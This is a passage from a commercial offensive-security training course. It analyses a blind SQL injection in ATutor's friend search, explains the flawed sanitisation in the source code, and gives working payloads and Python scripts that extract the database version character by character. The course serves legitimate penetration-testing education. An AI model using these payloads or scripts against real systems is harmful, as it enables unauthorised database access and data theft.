Listing 37 shows that the single quote part of our payload was not escaped correctly by the 
application. As a result, we should be dealing with a SQL injection vulnerability here. Moreover, 
from the logged query, it appears that we have not just one, but four different injection points. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
79 
As we continue to test the injection by sending two single quotes (not a single double quote), we 
are able to close the SQL query that is under our control. This can be verified by the fact that no 
errors are found in the response (Listing 38) nor in the MySQL log file. 
kali@kali:~/atutor$ python poc1.py atutor "AAAA''" 
Response Headers: 
{'Content-Length': '20', 'Content-Encoding': 'gzip', 'Set-Cookie': 
'ATutorID=38m1u0lvr8jatcnfb3382c7mk7; path=/ATutor/, 
ATutorID=98urnfikmqo7s5m4gog1dh6sj0; path=/ATutor/, 
ATutorID=98urnfikmqo7s5m4gog1dh6sj0; path=/ATutor/', 'Vary': 'Accept-Encoding', 'Keep-
Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.10 (Debian)', 'Connection': 'Keep-
Alive', 'Date': 'Tue, 24 Apr 2018 17:09:39 GMT', 'Content-Type': 'text/html; 
charset=utf-8'} 
 
Response Content: 
 
 
No errors found 
Listing 38 - After sending a double single quote payload, we receive no error message 
Checking the log file, we observe that the vulnerable query is now well-formed. 
        40925 Query SELECT customized FROM AT_themes WHERE dir_name = 'default' 
        40925 Query SELECT customized FROM AT_themes WHERE dir_name = 'default' 
        40925 Query SELECT * FROM AT_courses ORDER BY title 
        40925 Query SELECT dir_name, privilege, admin_privilege, status, 
cron_interval, cron_last_run FROM AT_modules WHERE status=2 
        40925 Query SELECT L.* FROM AT_language_text L, AT_language_pages P WHERE 
L.language_code="en" AND L.term=P.term AND 
P.page="/mods/_standard/social/index_public.php" ORDER BY L.variable ASC 
        40925 Query SELECT L.* FROM AT_language_text L WHERE L.language_code="en" AND 
L.term="test" ORDER BY variable ASC LIMIT 1 
        40925 Query INSERT IGNORE INTO AT_language_pages (`term`, `page`) VALUES 
("test", "/mods/_standard/social/index_public.php") 
        40925 Query SELECT * FROM AT_modules WHERE dir_name ='_core/services' && 
status ='2' 
        40925 Query    SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAA''%'  
OR second_name LIKE '%AAAA''%'  OR last_name LIKE '%AAAA''%'  OR login LIKE '%AAAA''%'  
) 
        40925 Quit   
Listing 39 - A double single quote payload creates a well-formed SQL query 
If you have had prior exposure to SQL injections using UNION queries, you may think this is a 
perfect opportunity to use them and directly retrieve arbitrary data from the ATutor database. 
From a very high-level perspective, that approach would look like this: 
SELECT * FROM AT_members M WHERE (first_name LIKE '%INJECTION_HERE') UNION ALL SELECT 
1,1,1,1,.......# 
Listing 40 - A high-level look at a possible UNION SQL injection 
While it is certainly possible to use UNION queries, they are unfortunately not useful to us in this 
case. Specifically, if we look at the code in Listing 41 from index_public.php, we can see that the 
results of the vulnerable query are actually not displayed to the user. Rather, on line 48, the query 
result set is used in a foreach loop that passes the retrieved $member_id on to the 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
80 
printSocialName function. The results of this function call are then displayed to the end-user using 
the PHP echo function. 
41:     //retrieve a list of friends by the search 
42:     $search_result = searchFriends($query); 
43:  
44:  
45:     if (!empty($search_result)){ 
46:         echo '<div class="suggestions">'._AT('suggestions').':<br/>'; 
47:         $counter = 0; 
48:         foreach($search_result as $member_id=>$member_array){ 
49:             //display 10 suggestions 
50:             if ($counter > 10){ 
51:                 break; 
52:             } 
53:  
54:             echo '<a href="javascript:void(0);" 
onclick="document.getElementById(\'search_friends\').value=\''.printSocialName($member
_id, false).'\'; 
document.getElementById(\'search_friends_form\').submit();">'.printSocialName($member_
id, false).'</a><br/>'; 
55:             $counter++; 
Listing 41 - The query result is used in a for loop 
In other words, the results of the payload we inject are not directly reflected back to us, so a 
traditional union query will not be helpful here. 
We can verify this by continuing to follow this code execution path. 
555: /** 
556:   * Print social name, with AT_print and profile link 
557:   * @param      int             member id 
558:   * @param      link    will return a hyperlink when set to true 
559:   * return      the name to be printed. 
560:   */ 
561: function printSocialName($id, $link=true){ 
562:     if(!isset($str)){ 
563:         $str = ''; 
564:     } 
565:         $str .= AT_print(get_display_name($id), 'members.full_name'); 
566:         if ($link) { 
567:                 return getProfileLink($id, $str); 
568:         } 
569:         return $str; 
570: } 
Listing 42 - The printSocialName function implementation in mods/_standard/social/lib/friends.inc.php 
The printSocialName function (Listing 42) passes the $member_id value ($id on line 565) to the 
get_display_name function defined in vital_funcs.inc.php. This function is shown in the listing 
below. 
299:    if (substr($id, 0, 2) == 'g_' || substr($id, 0, 2) == 'G_'){ 
300:        $sql = "SELECT name FROM %sguests WHERE guest_id='%d'"; 
301:         $row = queryDB($sql, array(TABLE_PREFIX, $id), TRUE); 
302:        return _AT($display_name_formats[$_config['display_name_format']], '', 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
81 
$row['name'], '', ''); 
303:    }else{ 
304:        $sql    = "SELECT login, first_name, second_name, last_name FROM %smembers 
WHERE member_id='%d'"; 
305:         $row    = queryDB($sql, array(TABLE_PREFIX, $id), TRUE); 
306:        return _AT($display_name_formats[$_config['display_name_format']], 
$row['login'], $row['first_name'], $row['second_name'], $row['last_name']); 
307:    } 
 
Listing 43 - get_display_name function code chunk 
On line 304 in Listing 43, we can see that get_display_name prepares and executes the final query 
using the passed $member_id parameter. The results of the query are then returned back to the 
caller. 
This execution logic effectively prevents us from using any UNION payload into the original 
vulnerable query and turns this SQL injection into a classical blind injection. 
Unlike the very basic SQL injection vulnerabilities, which allow the attacker to retrieve the desired 
data directly through the rendered web page, blind SQL injections force us to infer the data we 
seek, as it is never returned in the result set of the original query. This can happen for many 
reasons, such as web application logic that intercepts the query results and prepares them for 
display based on a set of rules, or error-handling pages whose content never changes regardless 
of what triggered the error. 
3.2.1.1 Exercises 
1. 
Repeat the injection process covered in the previous section and ensure that you can 
recreate the described results 
2. 
Disable display_errors in php.ini and restart the Apache service. Verify that no output is 
returned in the browser when triggering the SQL injection. 
3.3 A Brief Review of Blind SQL Injections 
Before we continue, we will briefly review how traditional blind SQL injections work. As mentioned 
before, in a blind SQLi attack, no data is actually transferred via the web application as the result 
of the injected payload. The attacker is therefore not able to see the result of an attack in-band. 
This leaves the attacker with only one choice: inject queries that ask a series of YES and NO 
questions (boolean queries) to the database and construct the sought information based on the 
answers to those questions. The way the information can be inferred depends on the type of blind 
injection we are dealing with. Blind SQL injections can be classified as boolean-based or time-
based. 
In Boolean-based injections an attacker injects a boolean SQL query into the database, which 
forces the web application to display different content in the rendered web page depending on 
whether the query evaluates to TRUE or FALSE. In this case the attacker can infer the outcome of 
the boolean SQL payload by observing the differences in the HTTP response content. 
In time-based blind SQL injections our ability to infer any information is even more limited 
because a vulnerable application does not display any differences in the content based on our 
injected TRUE/FALSE queries. In such cases, the only way to infer any information is by 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
82 
introducing artificial query execution delays in the injected subqueries via database-native 
functions that consume time. In the case of MySQL, that would be the sleep() function. 
As we saw previously, in our ATutor vulnerability we were able to execute a valid query by 
injecting two single quotes and as a result obtain an empty response (blank web page). 
kali@kali:~/atutor$ python poc1.py atutor "AAAA''" 
Response Headers: 
{'Content-Length': '20', 'Content-Encoding': 'gzip', 'Set-Cookie': 
'ATutorID=38m1u0lvr8jatcnfb3382c7mk7; path=/ATutor/, 
ATutorID=98urnfikmqo7s5m4gog1dh6sj0; path=/ATutor/, 
ATutorID=98urnfikmqo7s5m4gog1dh6sj0; path=/ATutor/', 'Vary': 'Accept-Encoding', 'Keep-
Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.10 (Debian)', 'Connection': 'Keep-
Alive', 'Date': 'Tue, 24 Apr 2018 17:09:39 GMT', 'Content-Type': 'text/html; 
charset=utf-8'} 
 
Response Content: 
 
 
No errors found 
Listing 44 - After sending a double single quote payload, we receive an empty response 
By providing the appropriate input however, we are able to change the outcome of the query and 
display relevant results within the web page. In the following example we are going to supply the 
prefix of a known and valid user to the q parameter. Our ATutor installation already has an 
“Offensive Security” user, so we are going to use the prefix “off”. 
 
Figure 73: An example search query result 
In the web response shown in Figure 73 we can clearly see that the application displays some 
data within the HTML page. This means that the vulnerability in question can be classified as 
boolean-based. We will play with a time-based SQL injection in another module of this course. 
3.4 Digging Deeper 
During our source code analysis, we identified a couple of instances in which the ATutor 
developers used a function called $addslashes against user input from the q GET parameter. A 
quick look at the PHP documentation verifies that this function should indeed escape our single 
tick payload, yet it didn’t. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
83 
3.4.1 When $addslashes Are Not 
An important item to note here is that the called function name is stored in a variable called 
$addslashes and that we are not calling the native PHP addslashes function.31 As a reminder, here 
is the partial Listing 29 again. 
37: //if $_GET['q'] is set, handle Ajax. 
38: if (isset($_GET['q'])){ 
39:     $query = $addslashes($_GET['q']); 
40:  
41:     //retrieve a list of friends by the search 
42:     $search_result = searchFriends($query); 
Listing 45 - Using $addslashes 
So we need to find where this $addslashes variable is defined. A quick grep search helps us find 
what we are looking for in the mysql_connect.inc.php file. 
092: if ( get_magic_quotes_gpc() == 1 ) { 
093:     $addslashes   = 'my_add_null_slashes'; 
094:     $stripslashes = 'stripslashes'; 
095: } else { 
096:     if(defined('MYSQLI_ENABLED')){ 
097:         // mysqli_real_escape_string requires 2 params, breaking wherever 
098:         // current $addslashes with 1 param exists. So hack with trim and  
099:         // manually run mysqli_real_escape_string requires during sanitization 
below 
100:         $addslashes   = 'trim'; 
101:     }else{ 
102:         $addslashes   = 'mysql_real_escape_string'; 
103:     } 
104:     $stripslashes = 'my_null_slashes'; 
105: } 
Listing 46 - Defining $addslashes 
Looking at Listing 46 we see something interesting. First, on line 92 there is a check for the Magic 
Quotes32 setting. If the Magic Quotes are on, then the $addslashes is defined as 
my_add_null_slashes. A quick look in the same file shows us that definition. 
77: //functions for properly escaping input strings 
78: function my_add_null_slashes( $string ) { 
79:     global $db; 
80:     if(defined('MYSQLI_ENABLED')){ 
81:         return $db->real_escape_string(stripslashes($string)); 
82:     }else{ 
83:         return mysql_real_escape_string(stripslashes($string)); 
84:     } 
85:  
86: } 
87:  
88: function my_null_slashes($string) { 
 
31 (PHP Group, 2020), https://www.php.net/manual/en/function.addslashes.php 
32 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Magic_quotes 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
84 
89:     return $string; 
90: } 
Listing 47 - Sanitizing function definitions 
On our vulnerable system, we can check whether this conditional branch would be taken. 
student@atutor:~$ cat /var/www/html/magic.php  
<?php 
var_dump(get_magic_quotes_gpc()); 
?> 
 
student@atutor:~$ curl http://localhost/magic.php  
bool(false) 
Listing 48 - The vulnerable target system does not have magic quotes on 
This result is expected because the version of PHP we are dealing with is 5.6.17 and Magic 
Quotes have been deprecated since version 5.4.0. 
student@atutor:~$ php -v 
PHP 5.6.17-0+deb8u1 (cli) (built: Jan 13 2016 09:10:12)  
Copyright (c) 1997-2015 The PHP Group 
Zend Engine v2.6.0, Copyright (c) 1998-2015 Zend Technologies 
    with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2015, by Zend Technologies 
Listing 49 - Target PHP version 
Since Magic Quotes are off, looking back at the code in Listing 46, we know that we will fall 
through to the else part of the conditional branch. Line 96 then checks whether the global variable 
MYSQLI_ENABLED is defined. If that is the case, then $addslashes becomes the trim function, 
seemingly due to legacy code and how the $addslashes function has been used in the past. 
Finally, after searching for the MYSQLI_ENABLED definition, we find it in vital_funcs.inc.php. 
16: /* test for mysqli presence */ 
17: if(function_exists('mysqli_connect')){ 
18:     define('MYSQLI_ENABLED', 1); 
19: }  
Listing 50 - Defining MYSQLI_ENABLED 
Considering that our ATutor installation runs on PHP 5.6, this implies that the mysqli_connect 
function must exist, as it is present by default since version 5.0 in the php5-mysql Debian 
package.33 
Therefore, our $addslashes function will do nothing more than simply trim the user input. In other 
words, there is no validation of user input when the $addslashes function is used! 
3.4.2 Improper Use of Parameterization 
Unfortunately for ATutor developers, this was not the real mistake. The application also defines 
and implements a function called queryDB, whose purpose is to enable the use of parameterized 
queries. This is the function that is called any time there is a SQL query to be executed and it is 
defined in the file mysql_connect.inc.php as well. Here is how it looks: 
 
33 (PHP Group, 2020), http://php.net/manual/en/mysqli.installation.php 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
85 
107: /** 
108:  * This function is used to make a DB query the same along the whole codebase 
109:  * @access  public 
110:  * @param   $query = Query string in the vsprintf format. Basically the first 
parameter of vsprintf function 
111:  * @param   $params = Array of parameters which will be converted and inserted 
into the query 
112:  * @param   $oneRow = Function returns the first element of the return array if 
set to TRUE. Basically returns the first row if it exists 
113:  * @param   $sanitize = if True then addslashes will be applied to every 
parameter passed into the query to prevent SQL injections 
114:  * @param   $callback_func = call back another db function, default 
mysql_affected_rows 
115:  * @param   $array_type = Type of array, MYSQL_ASSOC (default), MYSQL_NUM, 
MYSQL_BOTH, etc. 
116:  * @return  ALWAYS returns result of the query execution as an array of rows. If 
no results were found than array would be empty 
117:  * @author  Alexey Novak, Cindy Li, Greg Gay 
118:  */ 
119: function queryDB($query, $params=array(), $oneRow = false, $sanitize = true, 
$callback_func = "mysql_affected_rows", $array_type = MYSQL_ASSOC) { 
120:     if(defined('MYSQLI_ENABLED') && $callback_func == "mysql_affected_rows"){ 
121:         $callback_func = "mysqli_affected_rows"; 
122:     } 
123:     $sql = create_sql($query, $params, $sanitize); 
124:     return execute_sql($sql, $oneRow, $callback_func, $array_type); 
125:  
126: } 
Listing 51 - Implementation of the queryDB function 
As the Listing 51 shows (line 119), when the queryDB function is used correctly, the known and 
controlled parts of any given query are passed as the first argument. The user-controlled 
parameters are passed in an array as a second argument. The elements of the array are then 
properly sanitized with the help of the create_sql function which is called to construct the 
complete query (line 123). 
Here we can see that the create_sql function correctly sanitizes each string element of the 
parameters array using the real_escape_string function34 (line 189). 
182: function create_sql($query, $params=array(), $sanitize = true){ 
183:     global $addslashes, $db; 
184:     // Prevent sql injections through string parameters passed into the query 
185:     if ($sanitize) { 
186:         foreach($params as $i=>$value) { 
187:          if(defined('MYSQLI_ENABLED')){   
188:              $value = $addslashes(htmlspecialchars_decode($value, ENT_QUOTES));   
189:              $params[$i] = $db->real_escape_string($value); 
190:             }else { 
191:              $params[$i] = $addslashes($value);            
192:             } 
193:         } 
194:     } 
 
34 (PHP Group, 2020), http://php.net/manual/en/mysqli.real-escape-string.php 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
86 
195:  
196:     $sql = vsprintf($query, $params); 
197:     return $sql; 
198: } 
Listing 52 - Implementation of the create_sql function 
Recalling our earlier analysis of Listing 51, the values we control are used in the construction of 
the query string that is passed as the first parameter to the queryDB function ($sql), and not in an 
array of values that would get sanitized. 
309: $rows_friends = queryDB($sql, array(), '', FALSE); 
Listing 53 - An example of queryDB() function call 
Effectively, this means that the query string is built by concatenating the unsanitized string, which 
is then passed to the queryDB function. Once again, this avoids sanitization because the user-
controlled parameters were not passed in the array. 
This mistake, combined with the $addslashes definition as we described in the previous section, 
contribute to the SQL injection vulnerability. 
The wrong use of the queryDB function is an example of a software development mistake that we 
have encountered numerous times when auditing various web applications. It boils down to the 
fact that, at times, software developers do not fully understand how critical functions work. By not 
using them properly, the resulting code ends up being vulnerable to attacks, despite the fact that 
the critical function in question is designed correctly. 
Now that we have a complete understanding of this vulnerability, let’s see how we can exploit it. 
3.5 Data Exfiltration 
Before developing a method that we can use to extract arbitrary data from the database, we must 
keep in mind that our payloads cannot contain any spaces, since they are used as delimiters in 
the query construction process. As a reminder, here is that chunk of code again. 
271:   $name = $addslashes($name);  
272:   $sub_names = explode(' ', $name); 
273:    foreach($sub_names as $piece){ 
274:        if ($piece == ''){ 
275:            continue; 
276:        } 
Listing 54 - Spaces are used as delimiters 
However, since this is an ATutor-related constraint and not something inherent to MySQL, we can 
replace spaces with anything that constitutes a valid space substitute in MySQL syntax. 
As it turns out, we can use inline comments in MySQL as a valid space! For example, the following 
SQL query is, in fact, completely valid in MySQL. 
mysql> select/**/1; 
+---+ 
| 1 | 
+---+ 
| 1 | 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
87 
+---+ 
1 row in set (0.01 sec) 
Listing 55 - A valid MySQL query without spaces 
3.5.1 Comparing HTML Responses 
Now that we are fully aware of the restrictions in place, our first goal is to create a very simple 
dummy TRUE/FALSE injection subquery. 
This step is important as it will allow us to identify a baseline and see how the injected TRUE and 
FALSE subqueries influence the HTTP responses. Once we have established this, we will be able 
to basically ask the database arbitrary questions by replacing the dummy TRUE/FALSE 
subqueries with more complex boolean subqueries. This will allow us to infer the answers we 
seek by examining the HTTP responses. 
Here are the two dummy subqueries we can use to achieve our goal: 
AAAA')/**/or/**/(select/**/1)=1%23 
Listing 56 - The injected payload whereby the query evaluates to “true” 
AAAA')/**/or/**/(select/**/1)=0%23 
Listing 57 - The injected payload whereby the query evaluates to “false” 
Before injecting the subqueries, let’s see how that looks in a MySQL shell. For convenience, we 
have also changed the select * syntax from the original query to select count(*). Note that this 
simply changes how the result output is presented rather than the number of rows returned by 
the SQL injection attack. 
mysql> SELECT count(*) FROM AT_members M WHERE (first_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=1#%'  OR second_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=1#%'  OR last_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=1#%'  OR login LIKE 
'%AAAA')/**/or/**/(select/**/1)=1#%'); 
    -> ; 
+----------+ 
| count(*) | 
+----------+ 
|        1 | 
+----------+ 
1 row in set (0.00 sec) 
 
mysql> SELECT count(*) FROM AT_members M WHERE (first_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=0#%'  OR second_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=0#%'  OR last_name LIKE 
'%AAAA')/**/or/**/(select/**/1)=0#%'  OR login LIKE 
'%AAAA')/**/or/**/(select/**/1)=0#%'); 
    -> ; 
+----------+ 
| count(*) | 
+----------+ 
|        0 | 
+----------+ 
1 row in set, 4 warnings (0.01 sec) 
Listing 58 - Testing the TRUE/FALSE blind injection in the MySQL shell 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
88 
From the listings above, we can see that the TRUE/FALSE dummy subqueries control the number 
of results that are returned from the vulnerable query–so far so good. Please notice that the 
queries we used are literally the same injected ones that we can find in the MySQL log file. That 
means they include our comment control character as well. Once we execute those queries in the 
MySQL shell, we will see the following queries in the log file, which clearly demonstrates that we 
are able to use comments to terminate the query and that our injection string does not have to 
satisfy all 4 injection points. 
322 Query   SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA') or 
(select 1)=0 
322 Query   SELECT count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA') or 
(select 1)=1 
Listing 59 - Verifying query comment termination 
Now let’s trigger our vulnerability using the true statement and our proof of concept script. This 
will help us verify that everything is still going according to plan. 
kali@kali:~/atutor$ python poc.py atutor "AAAA')/**/or/**/(select/**/1)=1%23" 
Response Headers: 
{'Content-Length': '180', 'Content-Encoding': 'gzip', 'Set-Cookie': 
'ATutorID=k17jncu2mqnkjepg3b2ldur5m0; path=/ATutor/, 
ATutorID=1ehuuuggbmtdt9cm75t2cm4r36; path=/ATutor/, 
ATutorID=1ehuuuggbmtdt9cm75t2cm4r36; path=/ATutor/', 'Vary': 'Accept-Encoding', 'Keep-
Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.10 (Debian)', 'Connection': 'Keep-
Alive', 'Date': 'Tue, 24 Apr 2018 17:11:07 GMT', 'Content-Type': 'text/html; 
charset=utf-8'} 
 
Response Content: 
Suggestions:Offensive - Security 
 
No errors found 
Listing 60 - Executing a true statement SQL injection via the search friends 
While it may seem obvious to the astute student that (select 1)=1 will always be true, we must 
remember that what we are doing here is verifying that the complete query (with all its 
subqueries) is well-formed and will not cause any database errors. We also want to make sure 
that we control whether the database returns a result set or not, by changing the subquery 
comparison value from 1 to 0 respectively. 
kali@kali:~/atutor$ python poc.py atutor "AAAA')/**/or/**/(select/**/1)=0%23" 
Response Headers: 
{'Content-Length': '20', 'Content-Encoding': 'gzip', 'Set-Cookie': 
'ATutorID=vlpn8f9819c050302uskmg8es2; path=/ATutor/, 
ATutorID=4tbchrm3migc3nk8jg5qhr4357; path=/ATutor/, 
ATutorID=4tbchrm3migc3nk8jg5qhr4357; path=/ATutor/', 'Vary': 'Accept-Encoding', 'Keep-
Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.10 (Debian)', 'Connection': 'Keep-
Alive', 'Date': 'Tue, 24 Apr 2018 17:12:05 GMT', 'Content-Type': 'text/html; 
charset=utf-8'} 
 
Response Content: 
 
 
No errors found 
Listing 61 - Executing a false statement SQL injection via the search friends 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
89 
If we look at the responses from Listing 60 and Listing 61, we notice that when we inject a 
payload that makes the vulnerable query evaluate to FALSE, the response is basically empty 
(Content-Length: 20). However, if we inject a payload that forces the vulnerable query to evaluate 
to TRUE, we can see that there is a response body (Content-Length: 180). This effectively means 
we can use the Content-Length header and its value as our TRUE/FALSE indicator. 
The updated proof of concept script in Listing 62 includes this functionality. 
import requests 
import sys 
 
def searchFriends_sqli(ip, inj_str, query_type): 
    target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % 
(ip, inj_str) 
    r = requests.get(target) 
    content_length = int(r.headers['Content-Length']) 
    if (query_type==True) and (content_length > 20): 
        return True 
    elif (query_type==False) and (content_length == 20): 
        return True 
    else: 
        return False 
 
def main(): 
    if len(sys.argv) != 2: 
        print "(+) usage: %s <target>"  % sys.argv[0] 
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0] 
        sys.exit(-1) 
 
    ip = sys.argv[1] 
 
    false_injection_string = "test')/**/or/**/(select/**/1)=0%23" 
    true_injection_string  = "test')/**/or/**/(select/**/1)=1%23" 
 
    if searchFriends_sqli(ip, true_injection_string, True): 
        if searchFriends_sqli(ip, false_injection_string, False): 
            print "(+) the target is vulnerable!" 
 
if __name__ == "__main__": 
    main() 
Listing 62 - The above proof of concept implements the basic TRUE/FALSE logic needed to exfiltrate data 
After running the proof of concept script in Listing 62, we can confirm that both the TRUE and 
FALSE statements are working as intended. 
kali@kali:~/atutor$ python poc2.py atutor 
(+) the target is vulnerable! 
Listing 63 - Running the updated proof of concept 
3.5.2 MySQL Version Extraction 
We have finally reached the point at which we can develop a more complex query in order to 
exfiltrate valuable data from the database. Our first goal will be to extract the database version. 
In MySQL, the query to retrieve the database version information looks like this: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
90 
mysql> select/**/version(); 
+---------------------+ 
| version()           | 
+---------------------+ 
| 5.5.47-0+deb8u1-log | 
+---------------------+ 
1 row in set (0.01 sec) 
Listing 64 - MySQL query to identify the database version 
However, given the fact that we are dealing with a blind SQL injection, we have to resort to a byte-
by-byte approach, as we cannot retrieve a full response from the query. Therefore, we need to 
come up with a boolean MySQL version() subquery that will replace the dummy TRUE/FALSE 
subqueries used in the previous section. 
A query we can use will compare each byte of the subquery result (MySQL version) with a set of 
characters of our choice. We won’t be able to extract data directly, but we can ask the database if 
the first character of the version string is a “4” or a “5”, for example, and the result will be either 
TRUE or FALSE. 
mysql> select/**/(substring((select/**/version()),1,1))='4'; 
+-------------------------------------------+ 
| (substring((select version()), 1, 1))='4' | 
+-------------------------------------------+ 
|                                         0 | 
+-------------------------------------------+ 
1 row in set (0.00 sec) 
 
 
mysql> select/**/(substring((select/**/version()),1,1))='5'; 
+-------------------------------------------+ 
| (substring((select version()), 1, 1))='5' | 
+-------------------------------------------+ 
|                                         1 | 
+-------------------------------------------+ 
1 row in set (0.02 sec) 
Listing 65 - Selecting the first character of the database version and comparing it to a value 
As shown in Listing 65, in order to accomplish our task, we are relying on the substring function.35 
Essentially, this function returns any number of characters we choose, starting from any position 
in the target string. 
At this point, it is worth mentioning that it is good practice to convert the resultant character to its 
numeric ASCII value and then perform the comparison. The main reason for doing this is to avoid 
any other potential payload restrictions such as the use of quotes in the injection string. Although 
that is not the case for this particular vulnerability (we only have to avoid spaces), it is a practice 
you should get used to. In the case of MySQL, the relevant function to perform this conversion is 
ascii.36 
mysql> select/**/ascii(substring((select/**/version()),1,1))=52; 
+-----------------------------------------------+ 
 
35 (w3resource, 2020), https://www.w3resource.com/mysql/string-functions/mysql-substring-function.php 
36 (w3resource, 2020), https://www.w3resource.com/mysql/string-functions/mysql-ascii-function.php 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
91 
| ascii(substring((select version()),1,1))=52   | 
+-----------------------------------------------+ 
|                                             0 | 
+-----------------------------------------------+ 
1 row in set (0.00 sec) 
 
mysql> select/**/ascii(substring((select/**/version()),1,1))=53; 
+-----------------------------------------------+ 
| ascii(substring((select version()),1,1))=53   | 
+-----------------------------------------------+ 
|                                             1 | 
+-----------------------------------------------+ 
1 row in set (0.00 sec) 
 
Listing 66 - Using the ascii function to avoid payload restrictions 
Let’s now craft and test the whole injection query in the browser using the MySQL version() 
boolean subqueries: 
False Query: 
q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=52%23 
 
True Query: 
q=test%27)/**/or/**/(select/**/ascii(substring((select/**/version()),1,1)))=53%23 
Listing 67 - TRUE/FALSE MySQL version() subqueries 
 
Figure 74: The MySQL version() False subquery returns no result set as expected 
 
Figure 75: The MySQL version() True subquery returns a result set as expected 
Great! Everything is working according to our plan. We have finally reached the point where we 
can develop a script to automate the data retrieval from the MySQL database using the SQL 
injection vulnerability we have investigated in this module and the MySQL version() boolean 
subqueries we have just manually tested. We only need to play with the substring() function in our 
subqueries and loop over every single character of the version() result string comparing it with 
every possible character in the ASCII printable set37 (32-126, highlighted in Listing 68). 
import requests 
import sys 
 
37 (Wikipedia, 2020), https://en.wikipedia.org/wiki/ASCII 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
92 
 
def searchFriends_sqli(ip, inj_str): 
    for j in range(32, 126): 
        # now we update the sqli 
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, 
inj_str.replace("[CHAR]", str(j))) 
        r = requests.get(target) 
        content_length = int(r.headers['Content-Length']) 
        if (content_length > 20): 
            return j 
    return None     
 
def main(): 
    if len(sys.argv) != 2: 
        print "(+) usage: %s <target>"  % sys.argv[0] 
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0] 
        sys.exit(-1) 
 
    ip = sys.argv[1] 
 
    print "(+) Retrieving database version...." 
 
    # 19 is length of the version() string. This can 
    # be dynamically stolen from the database as well! 
    for i in range(1, 20): 
        injection_string = 
"test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i 
        extracted_char = chr(searchFriends_sqli(ip, injection_string)) 
        sys.stdout.write(extracted_char) 
        sys.stdout.flush() 
    print "\n(+) done!" 
 
if __name__ == "__main__": 
    main() 
Listing 68 - Database version extraction proof of concept script 
As shown in Listing 69, our final proof of concept script has successfully extracted the database 
version! 
kali@kali:~/atutor$ python poc3.py atutor  
(+) Retrieving database version.... 
5.5.47-0+deb8u1-log 
(+) done! 
Listing 69 - Extracting MySQL version through the blind SQL injection vulnerability 
3.5.2.1 Exercises 
1. 
Recreate the attack described in this section. Make sure you can retrieve the database 
version 
2. 
Modify the script to check whether the database user under whose context ATutor is running 
is a DBA 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
93 
3.5.2.2 Extra Mile 
Review the remainder of the code in index_public.php. Try to identify another path to the 
vulnerable function and modify the final data exfiltration script accordingly. 
3.6 Subverting the ATutor Authentication 
So far, we worked out a way to retrieve arbitrary information from the vulnerable ATutor database, 
and while that is a good first step, we need to see how we can use that information. An obvious 
choice would be to retrieve user credentials, but considering that modern applications rarely store 
plain-text credentials (sadly, it still happens), we would only be able to retrieve password hashes. 
This is also the case with ATutor, so even with password hashes in hand, we would still need to 
perform a bruteforce attack in order to possibly retrieve any cleartext account password. 
Another option is to investigate the login implementation and identify any potential weaknesses. 
Since password cracking success can be quite variable, we will take a deeper look at the login 
implementation in the ATutor application. 
Let’s first capture a valid login request using our Burp proxy, so that we have a good starting point 
for our analysis. A request similar to the one in the figure below was captured when performing a 
login request to the web application: 
 
Figure 76: A captured login request using teacher:teacher123 as the username and password 
